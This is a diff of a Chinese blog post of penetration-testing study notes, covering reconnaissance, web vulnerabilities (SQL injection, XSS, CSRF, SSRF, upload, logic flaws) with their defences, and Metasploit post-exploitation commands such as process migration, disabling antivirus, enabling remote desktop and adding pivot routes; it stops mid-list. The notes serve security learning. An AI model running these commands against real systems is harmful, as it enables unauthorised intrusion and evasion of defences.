@@ -87,7 +87,7 @@
   <time datetime="2023-05-12T16:21:20.000Z" itemprop="datePublished">2023-05-13</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a> / <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E3%80%8B/">《Web安全攻防渗透》</a> / <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E3%80%8B/msf/">msf</a>
   </div>
   
 <div class="word_count">
@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">3.9k</span>
+            <span class="post-count">7.2k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">14 分钟</span>
+            <span class="post-count">26 分钟</span>
         </span>
     </span>
 </div>
@@ -138,18 +138,59 @@
 <h4 id="2-1域名信息"><a href="#2-1域名信息" class="headerlink" title="2.1域名信息"></a>2.1域名信息</h4><p>正向记录(mx,ns,txt,spf,cname)</p>
 <p>反向查询(whois信息反查:电话、邮箱、姓名)</p>
 <p>备案信息</p>
-<h5 id="2-1-1-whois"><a href="#2-1-1-whois" class="headerlink" title="2.1.1 whois"></a>2.1.1 whois</h5><p>Whois就是一个用于查询域名是否已被注册以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。</p>
-<p>注册人的姓名和邮箱信息通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。对中小站点而言，域名所有人往往就是管理员。</p>
+<h5 id="2-1-1-whois"><a href="#2-1-1-whois" class="headerlink" title="2.1.1 whois"></a>2.1.1 whois</h5><p>Whois就是一个用于<strong>查询域名是否已被注册</strong>以及注<strong>册域名的详细信息的数据库</strong>（如域名所有人、域名注册商）。</p>
+<p><strong>注册人的姓名和邮箱信息</strong>通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。对中小站点而言，域名所有人往往就是管理员。</p>
 <p>kali可以在线查，在线Whois查询的常用网站有爱站工具网（<a target="_blank" rel="noopener" href="https://whois.aizhan.com)、站长之家(http//whois.chinaz.com%EF%BC%89%E5%92%8CVirusTotal%EF%BC%88https://www.virustotal.com%EF%BC%89%EF%BC%8C%E9%80%9A%E8%BF%87%E8%BF%99%E4%BA%9B%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%90%8D%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%95%86%E3%80%81%E5%9F%9F%E5%90%8D%E6%8B%A5%E6%9C%89%E8%80%85%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%BB%96%E4%BB%AC%E7%9A%84%E9%82%AE%E7%AE%B1%E3%80%81%E7%94%B5%E8%AF%9D%E3%80%81%E5%9C%B0%E5%9D%80%E7%AD%89%E3%80%82">https://whois.aizhan.com）、站长之家（http://whois.chinaz.com）和VirusTotal（https://www.virustotal.com），通过这些网站可以查询域名的相关信息，如域名服务商、域名拥有者，以及他们的邮箱、电话、地址等。</a></p>
 <h5 id="2-1-2-备案信息查询"><a href="#2-1-2-备案信息查询" class="headerlink" title="2.1.2 备案信息查询"></a>2.1.2 备案信息查询</h5><p>网站备案是根据国家法律法规规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止在网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。</p>
 <p>常用的网站有以下这两个。</p>
 <p>● ICP备案查询网：<a target="_blank" rel="noopener" href="http://www.beianbeian.com./">http://www.beianbeian.com。</a></p>
 <p>● 天眼查：<a target="_blank" rel="noopener" href="http://www.tianyancha.com./">http://www.tianyancha.com。</a></p>
-<h4 id="2-2-收集敏感信息"><a href="#2-2-收集敏感信息" class="headerlink" title="2.2 收集敏感信息"></a>2.2 收集敏感信息</h4><blockquote>
-<p>google搜搜引擎</p>
+<h4 id="2-2-收集敏感信息"><a href="#2-2-收集敏感信息" class="headerlink" title="2.2 收集敏感信息"></a>2.2 收集敏感信息</h4><p>google搜索引擎</p>
+<table>
+<thead>
+<tr>
+<th>关键字</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>site</td>
+<td>指定域名</td>
+</tr>
+<tr>
+<td>inurl</td>
+<td>url存在关键字的网页</td>
+</tr>
+<tr>
+<td>intext</td>
+<td>网页正文中的关键字</td>
+</tr>
+<tr>
+<td>Filetype</td>
+<td>指定文件类型</td>
+</tr>
+<tr>
+<td>intitle</td>
+<td>网页标题中的关键字</td>
+</tr>
+<tr>
+<td>link</td>
+<td>link:xxx.ip，返回所有和xxx.ip做了链接的url</td>
+</tr>
+<tr>
+<td>info</td>
+<td>查找指定站点的一些基本信息</td>
+</tr>
+<tr>
+<td>cache</td>
+<td>搜索谷歌里关于某些内容的缓存</td>
+</tr>
+</tbody></table>
+<p>例如： <strong>site: edu.cn intext:后台管理</strong>，网页中正文含有intext，域名后缀为site</p>
+<blockquote>
 <p>github(数据库连接信息、邮箱密码、uc-key、阿里的osskey，有时还可以找到泄露的源代码等。)</p>
 <p>bp的repeater模块(go运行后，右侧的response模块中可以获取一些服务器的信息)</p>
-<p>wy漏洞表查看历史漏洞信息</p>
+<p>乌云漏洞表查看历史漏洞信息</p>
 </blockquote>
 <h4 id="2-3-收集子域名信息"><a href="#2-3-收集子域名信息" class="headerlink" title="2.3 收集子域名信息"></a>2.3 收集子域名信息</h4><p>主域攻不下来，那就转二级域名。</p>
 <p>子域搜索方法：</p>
@@ -170,7 +211,7 @@
 <p><strong>4.证书透明度公开日志枚举</strong></p>
 <blockquote>
 <p>证书透明度（Certificate Transparency,CT）是证书授权机构（CA）的一个项目，证书授权机构会将每个SSL&#x2F;TLS证书发布到公共日志中。一个SSL&#x2F;TLS证书通常包含域名、子域名和邮件地址，这些也经常成为攻击者非常希望获得的有用信息。查找某个域名所属证书的最简单的方法就是使用搜索引擎搜索一些公开的CT日志。</p>
-<p>网站推荐：</p>
+<p>在线查询网站推荐：</p>
 <p>crt.sh:<a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh</a></p>
 <p>censys:<a target="_blank" rel="noopener" href="https://censys.io/">https://censys.io</a></p>
 <p>子域名爆破网站（<a target="_blank" rel="noopener" href="https://phpinfo.me/domain%EF%BC%89">https://phpinfo.me/domain）</a></p>
@@ -195,13 +236,13 @@
 <p><strong>特殊服务端口</strong></p>
 <p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620100307483.png" alt="特殊服务端口"></p>
 <h4 id="2-5-指纹识别"><a href="#2-5-指纹识别" class="headerlink" title="2.5 指纹识别"></a>2.5 指纹识别</h4><p>指纹由于其终身不变性、唯一性和方便性，几乎已成为生物特征识别的代名词。这里所讲的指纹是指<strong>网站CMS指纹识别</strong>、<strong>计算机操作系统及Web容器的指纹识别</strong>等。</p>
-<p>应用程序一般在html、js、css等文件中多多少少会包含一些特征码，比如WordPress在robots.txt中会包含wp-admin、首页index.php中会包含generator&#x3D;wordpress 3.xx，这个特征就是这个CMS的指纹，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS，所以叫作指纹识别。</p>
+<p>应用程序一般在html、js、css等文件中多多少少会包含一些特征码，比如WordPress在robots.txt中会包含wp-admin、首页index.php中会包含<strong>generator&#x3D;wordpress 3.xx</strong>，这个特征就是这个CMS的指纹，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS，所以叫作指纹识别。</p>
 <p>对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>
 <h5 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h5><p>CMS（Content Management System）又称整站系统或文章系统。在2004年以前，如果想进行网站内容管理，基本上都靠手工维护，但在信息爆炸的时代，完全靠手工完成会相当痛苦。所以就出现了CMS，开发者只要给客户一个软件包，<strong>客户自己安装配置好，就可以定期更新数据来维护网站</strong>，节省了大量的人力和物力。</p>
 <blockquote>
 <p>常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。</p>
 </blockquote>
-<p>代表工具有御剑Web指纹识别、WhatWeb、WebRobo、椰树、轻量WEB指纹识别等，可以快速识别一些主流CMS。</p>
+<p><strong>代表工具</strong>有御剑Web指纹识别、WhatWeb、WebRobo、椰树、轻量WEB指纹识别等，可以快速识别一些主流CMS。</p>
 <p>还有一些在线网站查询CMS</p>
 <blockquote>
 <p>● BugScaner:<a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/look/%E3%80%82">http://whatweb.bugscaner.com/look/。</a></p>
@@ -223,7 +264,8 @@
 <p>● <strong>国外访问</strong>。国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站App Synthetic Monitor（<a target="_blank" rel="noopener" href="https://asm.ca.com/en/ping.php%EF%BC%89%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%BE%97%E5%88%B0%E7%9C%9F%E5%AE%9E%E7%9A%84IP%EF%BC%8C">https://asm.ca.com/en/ping.php）访问，可能会得到真实的IP，</a></p>
 <p>● <strong>查询域名的解析记录</strong>。也许目标很久以前并没有用过CDN，所以可以通过网站NETCRAFT（<a target="_blank" rel="noopener" href="https://www.netcraft.com/%EF%BC%89%E6%9D%A5%E8%A7%82%E5%AF%9F%E5%9F%9F%E5%90%8D%E7%9A%84IP%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%A4%A7%E8%87%B4%E5%88%86%E6%9E%90%E5%87%BA%E7%9B%AE%E6%A0%87%E7%9A%84%E7%9C%9F%E5%AE%9EIP%E6%AE%B5%E3%80%82">https://www.netcraft.com/）来观察域名的IP历史记录，也可以大致分析出目标的真实IP段。</a></p>
 <p>● <strong>如果目标网站有自己的App</strong>，可以尝试利用Fiddler或Burp Suite抓取App的请求，从里面找到目标的真实IP。</p>
-<p>● <strong>绕过CloudFlare CDN查找真实IP</strong>。现在很多网站都使用CloudFlare提供的CDN服务，在确定了目标网站使用CDN后，可以先尝试通过在线网站Cloud FlareWatch（<a target="_blank" rel="noopener" href="http://www.crimeflare.us/cfs.html#box%EF%BC%89%E5%AF%B9CloudFlare%E5%AE%A2%E6%88%B7%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E7%9C%9F%E5%AE%9EIP%E6%9F%A5%E8%AF%A2">http://www.crimeflare.us/cfs.html#box）对CloudFlare客户网站进行真实IP查询</a></p>
+<p>●</p>
+<p> <strong>绕过CloudFlare CDN查找真实IP</strong>。现在很多网站都使用CloudFlare提供的CDN服务，在确定了目标网站使用CDN后，可以先尝试通过在线网站Cloud FlareWatch（<a target="_blank" rel="noopener" href="http://www.crimeflare.us/cfs.html#box%EF%BC%89%E5%AF%B9CloudFlare%E5%AE%A2%E6%88%B7%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E7%9C%9F%E5%AE%9EIP%E6%9F%A5%E8%AF%A2">http://www.crimeflare.us/cfs.html#box）对CloudFlare客户网站进行真实IP查询</a></p>
 </blockquote>
 <h5 id="2-6-4-验证获取的ip"><a href="#2-6-4-验证获取的ip" class="headerlink" title="2.6.4 验证获取的ip"></a>2.6.4 验证获取的ip</h5><p>如果是Web，最简单的验证方法是直接尝试用IP访问，<strong>看看响应的页面是不是和访问域名返回的一样</strong>；或者在目标段比较大的情况下，借助类似Masscan的工具批扫描对应IP段中所有开了80、443、8080端口的IP，然后逐个尝试IP访问，<strong>观察响应结果是否为目标站点</strong>。</p>
 <h4 id="2-7-收集敏感目录文件"><a href="#2-7-收集敏感目录文件" class="headerlink" title="2.7 收集敏感目录文件"></a>2.7 收集敏感目录文件</h4><p>探测Web目录结构和隐藏的敏感文件是一个必不可少的环节，从中可以获取网站的<strong>后台管理页面</strong>﹑<strong>文件上传界面</strong>，甚至可能<strong>扫描出网站的源代码</strong>。</p>
@@ -243,28 +285,249 @@
 <p>还有社工库。</p>
 </blockquote>
 <p>具体方法，参考<a target="_blank" rel="noopener" href="http://t.csdn.cn/kz56q">csdn思源湖的鱼</a></p>
-<h3 id="3-渗透攻击"><a href="#3-渗透攻击" class="headerlink" title="3.渗透攻击"></a>3.渗透攻击</h3><p>专业的团队会综合以上所有的阶段收集回来的情报，特别是漏洞扫描结果，服务器的配置，防火墙的使用情况，通过分析确定可利用的和待挖掘的漏洞，选择针对性工具使用或开发。</p>
+<h2 id="二、渗透攻击"><a href="#二、渗透攻击" class="headerlink" title="二、渗透攻击"></a>二、渗透攻击</h2><p>专业的团队会综合以上所有的阶段收集回来的情报，特别是漏洞扫描结果，服务器的配置，防火墙的使用情况，通过分析确定可利用的和待挖掘的漏洞，选择针对性工具使用或开发。</p>
 <h4 id="漏洞挖掘和利用"><a href="#漏洞挖掘和利用" class="headerlink" title="漏洞挖掘和利用"></a>漏洞挖掘和利用</h4><p>验证漏洞是否存在，最终getshell或拿到管理后台</p>
 <p>owasp top10，web基本漏洞。</p>
-<h3 id="4-提权和后门"><a href="#4-提权和后门" class="headerlink" title="4.提权和后门"></a>4.提权和后门</h3><p><a target="_blank" rel="noopener" href="https://fishpond.blog.csdn.net/article/details/109450658">CSDN思源湖的鱼</a></p>
-<h3 id="5-内网攻击"><a href="#5-内网攻击" class="headerlink" title="5.内网攻击"></a>5.内网攻击</h3><p><a target="_blank" rel="noopener" href="https://fishpond.blog.csdn.net/article/details/117286294">CSDN思源湖的鱼</a></p>
+<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p><strong>what</strong></p>
+<p>直接作用对象是后端中和sql有关的代码，由于开发者没有对参数进行合格的校验，使得攻击者构造特定的sql语句，这些参数被代入到数据库，达到了获取数据库敏感数据的目的</p>
+<p><strong>原理</strong></p>
+<ol>
+<li><strong>前端传给后端的参数，用户可控</strong></li>
+<li><strong>传入的参数代入拼接到sql语句，带入数据库查询</strong></li>
+</ol>
+<p>当初学习sql语句，有一点讲究<strong>闭合</strong>，相当于故意引起报错吧</p>
+<p>Mysql有一些固定的字段</p>
+<p><strong>inform1111111ation_schema库中有schemata、tables、columns</strong></p>
+<p><strong>table_schema、table_name、column_name</strong></p>
+<p>几个函数： <code>databse()、version()、user()</code></p>
+<p>注释符：<code>#、s--+、/**/</code></p>
+<p>内联注释：<code>/*! code*/</code> 用于整个sql语句</p>
+<p>具体的sql语句使用可以去，b站鱼皮有一个开源的练习数据库网站</p>
+<p>注入测试的话，这个网址 <a target="_blank" rel="noopener" href="https://www.db-fiddle.com/f/mZ2ftcLLzZLbrEELn38hjQ/0">https://www.db-fiddle.com/f/mZ2ftcLLzZLbrEELn38hjQ/0</a></p>
+<blockquote>
+<p>select * from users where id &#x3D;~~1; 这是一种绕过技巧，取反的取反</p>
+</blockquote>
+<p>基本的sql注入有：联合注入、布尔注入、报错注入</p>
+<p>从代码来看：</p>
+<blockquote>
+<p>联合注入：肯定有将查询结果输出的语句</p>
+<p>布尔注入：语句只有yes或no，而不会返回数据</p>
+<p>报错注入：代码中有 mysqli_error()返回错误</p>
+</blockquote>
+<p>进阶有：时间注入、堆叠查询注入、二次注入、宽字节注入、Cookie注入、base64注入、xff注入</p>
+<p>从代码来看：</p>
+<blockquote>
+<p>时间注入：页面不返回数据，没有过滤sleep函数什么的</p>
+<p>堆叠查询注入：代码中PDO方式进行数据查询，但仍然将参数ID拼接到查询语句，这样预编译没效果，所以多语句之间可以分号隔开</p>
+<p>二次注入：注册的时候，代码可能拼接的时候，使用了函数过滤单引号，比如：</p>
+<p>addslashes($username)，$username&#x3D;test’，然后插入数据库</p>
+<p>那么username就为 **test’**；</p>
+<p>然后你登录的时候，代码可能没有使用转义函数，导致输入用户名test’报错；这种一般是修改已知用户名的密码的漏洞，已知有个test，你注册个test’，到时候登录进去，修改的是test的密码</p>
+<p>宽字节注入：比如转义函数，对拼接参数进行转义，而在查询数据库前，又设置了gbk编码，导致了宽字节注入</p>
+<p>Cookie注入：获取参数时，可能是通过 $_COOKIE[‘id’]</p>
+<p>base64注入：代码也许有decode解码语句</p>
+<p>XFF注入：X-Forwarded-for。代表客户端真实IP，也许可以伪造成127.0.0.1访问url时，也会正常显示，那可以考虑闭合一下，之类的操作</p>
+</blockquote>
+<p><strong>防御</strong></p>
+<p>1.过滤危险字符</p>
+<p>2.预编译，(不将变量直接拼接到sql语句，而是用占位符实现数据库的增删改查)</p>
+<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p><strong>what</strong></p>
+<p>构造特定的js语句，内嵌到前端页面上，触发</p>
+<p><strong>分类</strong></p>
+<p>dos不考虑了，一般就两种：</p>
+<p>反射型：</p>
+<blockquote>
+<p>攻击方式：让受害者访问包含xss代码的链接</p>
+</blockquote>
+<p>存储性：</p>
+<blockquote>
+<p>留言板、博客这种，存储在服务器上</p>
+</blockquote>
+<p>常用语句、编码绕过</p>
+<p><strong>防御</strong></p>
+<p>1.过滤输入语句</p>
+<p>2.对<strong>输出到页面的数据</strong>进行<strong>编码转换</strong>，比如htmlspecial实体</p>
+<h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p><strong>what</strong></p>
+<p> 跨站请求伪造，要说与xss的区别，它其实一般伪造成一个网站。</p>
+<p>当受害者登录某个第三方网站的时候，它打开了新标签，去访问恶意网址，这个恶意网站里加载一些恶意的外部资源，使得受害者在第三方网站的信息，比如cookie啊，数据之类的就被攻击者拿到了。</p>
+<p>csrf做的事情一般是借用目标用户的名义去执行些非法操作</p>
+<p>比如转账</p>
+<p><code>www.exmaple.com/pay.php?user=xx&amp;&amp;money=100</code>，比如给xx转了100</p>
+<p>但是访问了之后的链接：</p>
+<p><code>www.exmaple.com/pay.php?user=hacker&amp;&amp;money=100</code>，那就给hacker赚了100</p>
+<p>可能会觉得傻逼，谁会这样点，如果我将上面这个链接弄成了短链接，我想问阁下如何应对，警惕性至少会少了些</p>
+<p><strong>原理</strong></p>
+<ol>
+<li>受害者登录了网站，能够执行该网站的功能</li>
+<li>受害者同时访问了攻击者构造的恶意网站</li>
+</ol>
+<p><strong>利用</strong></p>
+<p>诱导用户，访问攻击者写好的网址，只要访问了，有些操作就执行完毕了</p>
+<p>这个东西其实还牵扯到了跨域，可以了解下 jsonp、cors</p>
+<p><strong>防御</strong></p>
+<ol>
+<li>验证请求的Referer值</li>
+<li>token，也就是攻击者伪造不了的信息</li>
+</ol>
+<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p><strong>what</strong></p>
+<p>服务器主动发出请求访问了恶意网址</p>
+<p><strong>原理</strong></p>
+<p>服务端有访问其他服务器的能力，被攻击者用来尝试访问内部网络</p>
+<p><strong>主要攻击方式</strong></p>
+<ul>
+<li>对外网、服务器所在内网、本地端口扫描，获取一些服务器的banner信息</li>
+<li>攻击运行在内网、本地的应用程序</li>
+<li>对内网Web应用指纹识别，识别企业内部的资产信息</li>
+<li>攻击内外网的Web应用，主要是Http Get请求就可以实现的攻击</li>
+<li>利用file协议读取本地文件等</li>
+</ul>
+<p><strong>利用</strong></p>
+<p>你比如有</p>
+<p><code>http://exmaple.com/ssrf.php?url=192.168.0.2:3306</code></p>
+<p>回显说</p>
+<blockquote>
+<p>当前地址不允许连接到Mysql服务器</p>
+</blockquote>
+<p>说明192.168.0.2是有Mysql服务的</p>
+<p><strong>代码分析</strong></p>
+<p>有访问外部请求的函数，比如curl_exec、file_get_contents</p>
+<p><strong>防御</strong></p>
+<p>限制协议为http(s)</p>
+<p>限制端口</p>
+<p>限制内网IP，屏蔽10.0,192.168,172.16开头的</p>
+<p>统一错误消息</p>
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p><strong>原理</strong></p>
+<p>上传恶意脚本文件(webshell)到目标服务端上去，攻击端这边去访问的话，能够执行一些系统调用命令，从而获取到目标服务端信息</p>
+<p>图片马的使用</p>
+<p><strong>绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.js前端绕过</span><br><span class="line">2.文件后缀绕过</span><br><span class="line">3.文件类型绕过 Content-Type</span><br><span class="line">4.文件截断绕过</span><br><span class="line">5.竞争条件攻击：有的后端逻辑是允许，先将文件上传上来，再判断其是否合法，不合法就删除，这中间的非法文件就有一个短暂的停留过程</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御</strong></p>
+<p>1.白名单</p>
+<p>2.重命名，比如(时间戳)</p>
+<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p><strong>原理</strong></p>
+<p>字典攻击呗，猜解呗</p>
+<p><strong>防御</strong></p>
+<ol>
+<li>用户登录次数超过阈值，锁定账号</li>
+<li>某个IP登录次数超过阈值，锁IP（但如果一个IP多个账号，那其他账号也不行了）</li>
+</ol>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>以php为例，有些函数很强大，强大到执行系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system</span><br><span class="line">exec</span><br><span class="line">shell_exec</span><br><span class="line">passthru</span><br><span class="line">popen</span><br><span class="line">proc_popen</span><br></pre></td></tr></table></figure>
+
+<p>如果攻击者可以控制这些函数的参数的话，就会造成些攻击行为</p>
+<p><strong>防御</strong></p>
+<ul>
+<li>尽量不用命令执行函数</li>
+<li>客户端交过来的数据要严格限制和过滤</li>
+</ul>
+<h4 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h4><p>利用业务设计缺陷，获取敏感信息或者破坏业务完整性</p>
+<p>一般出现在 密码修改、找回；越权访问、支付金额等</p>
+<p>那越权呢，分为两种：水平和垂直</p>
+<p>水平：同级别权限的用户可以越权访问、修改或删除其他用户信息的非法操作</p>
+<p>垂直：一般表现为普通权限用户能够执行管理员权限的功能</p>
+<p><strong>分类</strong></p>
+<ul>
+<li><p>支付订单：篡改金额</p>
+</li>
+<li><p>越权访问：越权访问他人信息并修改</p>
+</li>
+<li><p>重置密码：</p>
+</li>
+<li><p>竞争条件：购物时，用户A有10元，商品B为6元，商品C为5元；A分别购买的话，不够买另一个，但如果多线程同时发送购买商品B和C的请求，可能出现：</p>
+<blockquote>
+<p>有一件商品失败</p>
+<p>商品都购买成功，但只扣了6元</p>
+<p>都购买成功，但余额变为-1</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>越权漏洞例子</strong></p>
+<p>打开我的pikachu靶场</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=点击查看个人信息</span><br><span class="line"></span><br><span class="line">将kobe换成lili</span><br><span class="line">就能查看lili的个人信息</span><br></pre></td></tr></table></figure>
+
+<p><strong>越权防御</strong></p>
+<p>session，取数据从session里面取，防止篡改</p>
+<h4 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h4><p>xml外部实体有关的</p>
+<h3 id="提权和后门"><a href="#提权和后门" class="headerlink" title="提权和后门"></a>提权和后门</h3><p><a target="_blank" rel="noopener" href="https://fishpond.blog.csdn.net/article/details/109450658">CSDN思源湖的鱼</a></p>
+<h3 id="内网攻击"><a href="#内网攻击" class="headerlink" title="内网攻击"></a>内网攻击</h3><p><a target="_blank" rel="noopener" href="https://fishpond.blog.csdn.net/article/details/117286294">CSDN思源湖的鱼</a></p>
 <h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><p>漏洞自查，周期性自扫；</p>
 <p>权限的检查</p>
 <p>代码审查</p>
 <p>敏感函数的使用</p>
 <p>WAF</p>
-<h2 id="渗透工具"><a href="#渗透工具" class="headerlink" title="渗透工具"></a>渗透工具</h2><h4 id="3-1-sqlmap"><a href="#3-1-sqlmap" class="headerlink" title="3.1 sqlmap"></a>3.1 sqlmap</h4><p>SQLMap是一个自动化的SQL注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置了很多绕过插件，支持的数据库是MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB。SQLMap采用了以下5种独特的SQL注入技术。</p>
+<h2 id="三、msf技术"><a href="#三、msf技术" class="headerlink" title="三、msf技术"></a>三、msf技术</h2><p>msf (metasploit framwork)</p>
+<h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p><strong>1.Auxiliaries(辅助模块)</strong></p>
+<p>负责执行扫描、嗅探、指纹识别等</p>
+<p><strong>2.Exploit(漏洞利用)</strong></p>
+<p>针对系统、应用或服务漏洞进行的攻击行为；还有针对系统漏洞而设计的各种POC验证程序，也有相应的EXP利用代码</p>
+<p><strong>3.payload(攻击载荷)</strong></p>
+<p>传送和植入的可以在目标系统上运行任意命令或执行特定行为的代码</p>
+<p><strong>4.Post(后渗透)</strong></p>
+<p>取得目标系统远程控制后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板等</p>
+<p><strong>5.Encoders(编码)</strong></p>
+<p>负责免杀</p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul>
+<li>扫描目标机，扫端口，扫服务，寻找可利用漏洞</li>
+<li>选择并配置一个漏洞利用模块</li>
+<li>选择并配置一个攻击载荷模块</li>
+<li>选择一个编码技术，绕过杀软</li>
+<li>渗透攻击</li>
+</ul>
+<h3 id="实用"><a href="#实用" class="headerlink" title="实用"></a>实用</h3><p>namp的 -O -Pn </p>
+<p>-Pn不ping，避免被防火墙发现</p>
+<h4 id="后渗透："><a href="#后渗透：" class="headerlink" title="后渗透："></a><strong>后渗透：</strong></h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>当获得了目标的metasploit shell时，该shell是极其脆弱的，如果是利用浏览器漏洞攻陷了目标机器，用户一旦关闭了浏览器，shell就没办法用了。</p>
+<p>1.所以第一时间要<strong>进程迁移</strong></p>
+<p>将它和目标机中的一个稳定的进程绑定在一起</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps <span class="comment">#在kali中输入 `ps`获取目标机的进程</span></span><br><span class="line">getpid <span class="comment">#查看当前进程的pid</span></span><br><span class="line">migrate 448 <span class="comment">#将shell移动到pid为448的进程里</span></span><br></pre></td></tr></table></figure>
+
+<p>2.<strong>系统命令</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sysinfo <span class="comment">#查看目标机的系统信息</span></span><br><span class="line">run post/windows/gather/checkvm <span class="comment">#检查目标机是否运行在虚拟机上</span></span><br><span class="line">idletime <span class="comment">#查看目标机最近运行时间</span></span><br><span class="line">route <span class="comment">#查看目标机完整的网络设置</span></span><br><span class="line">getuid <span class="comment">#查看当前目标机上渗透成功的用户名</span></span><br><span class="line">run post/windows/manage/killav <span class="comment">#关闭目标机系统杀软</span></span><br><span class="line">run post/windows/manage/enable_rdp <span class="comment">#启动目标机的远程桌面协议，3389</span></span><br><span class="line">run post/windows/manage/autoroute <span class="comment">#查看目标机的本地子网情况</span></span><br><span class="line"><span class="comment">#比如看到了个..172.0的子网</span></span><br><span class="line">route add <span class="comment">#添加这个路由</span></span><br><span class="line"><span class="comment">#route add 192.168.172.0 255.255.255.0 1</span></span><br><span class="line"><span class="comment">#将这个路由添加到了已攻陷主机的路由表中，可以通过被攻陷主机对其它网路攻击了</span></span><br><span class="line"></span><br><span class="line">run post/windows/gather/enum_logged_on_users <span class="comment">#列举当前多少用户登录了目标机</span></span><br><span class="line">run post/windows/gather/enum_applications <span 